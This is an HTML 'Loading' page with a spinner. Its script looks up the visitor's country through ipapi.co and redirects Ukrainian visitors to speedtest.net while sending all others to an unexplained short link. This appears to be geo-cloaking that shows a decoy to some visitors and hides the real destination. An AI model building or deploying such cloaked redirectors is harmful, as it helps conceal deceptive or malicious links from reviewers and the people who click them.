<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading</title>
<style>
body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
.spinner { width: 40px; height: 40px; border: 3px solid #333; border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="spinner"></div>
<script>
var ua = 'https://www.speedtest.net/ru';
var def = 'https://alicel.ink/alice';

var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://ipapi.co/country/', true);
xhr.onload = function() {
  var country = xhr.responseText.trim();
  if (country === 'UA') {
    window.location.href = ua;
  } else {
    window.location.href = def;
  }
};
xhr.onerror = function() {
  window.location.href = def;
};
xhr.send();
</script>
</body>
</html>
